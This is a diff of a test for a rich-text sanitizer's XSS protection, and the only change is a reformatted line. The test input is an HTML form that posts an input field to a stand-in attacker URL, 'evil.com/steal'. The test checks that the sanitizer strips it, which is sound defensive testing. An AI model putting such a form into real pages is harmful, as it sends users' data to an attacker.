@@ -67,7 +67,9 @@ describe('sanitizeRichtext() — XSS prevention', () => {
   })
 
   it('strips <form> elements (prevents CSRF via richtext)', () => {
-    const result = sanitizeRichtext('<form action="https://evil.com/steal"><input name="data"><button>Submit</button></form>')
+    const result = sanitizeRichtext(
+      '<form action="https://evil.com/steal"><input name="data"><button>Submit</button></form>',
+    )
     expect(result).not.toContain('<form')
     expect(result).not.toContain('evil.com')
   })
